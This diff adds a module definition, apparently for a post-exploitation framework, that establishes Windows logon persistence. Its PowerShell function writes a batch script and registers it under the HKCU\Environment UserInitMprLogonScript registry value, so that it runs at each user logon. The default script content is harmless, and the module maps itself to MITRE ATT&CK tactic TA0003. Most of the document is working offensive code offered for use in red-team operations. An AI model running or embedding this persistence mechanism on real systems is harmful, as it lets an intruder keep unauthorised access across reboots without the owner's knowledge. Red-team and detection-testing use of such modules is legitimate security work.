@@ -1,0 +1,75 @@
+name: Logon-Script
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Establishes persistence by setting the UserInitMprLogonScript
+  registry value under HKCU\Environment. This value specifies a
+  script that Windows executes during user logon. The module can
+  create a batch script with custom content and register it, or
+  point to an existing script. This is a well-known persistence
+  mechanism that survives reboots.
+software: ''
+tactics: [TA0003]
+techniques: [T1037.001]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: ScriptPath
+    description: Path where the logon script will be written.
+    required: false
+    value: '$env:TEMP\logon_script.bat'
+  - name: ScriptContent
+    description: >-
+      Content of the logon script. Leave empty to just set the registry key pointing
+      to ScriptPath.
+    required: false
+    value: 'echo Logon Script Executed >> %USERPROFILE%\desktop\logon_log.txt'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Set-LogonScript {
+      param(
+          [string]$ScriptPath,
+          [string]$ScriptContent
+      )
+
+      $scriptFile = $ExecutionContext.InvokeCommand.ExpandString($ScriptPath)
+
+      # Create the script file if content is provided
+      if ($ScriptContent) {
+          $ScriptContent | Out-File -FilePath $scriptFile -Encoding ASCII -Force
+          Write-Output "[+] Created logon script: $scriptFile"
+          Write-Output "[+] Content: $ScriptContent"
+      } elseif (-not (Test-Path $scriptFile)) {
+          Write-Output "[-] Script file does not exist and no content provided: $scriptFile"
+          return
+      }
+
+      # Set the registry value
+      REG.exe ADD "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "$scriptFile" /f 2>&1 | Out-Null
+      Write-Output "[+] Set UserInitMprLogonScript registry value."
+      Write-Output "[+] Script will execute on next user logon: $scriptFile"
+
+      # Verify
+      $regVal = (Get-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue).UserInitMprLogonScript
+      if ($regVal) {
+          Write-Output "[+] Verified: UserInitMprLogonScript = $regVal"
+      } else {
+          Write-Output "[-] Failed to verify registry value."
+      }
+  }
+script_end: Set-LogonScript -ScriptPath "{{ ScriptPath }}" -ScriptContent "{{ ScriptContent
+  }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
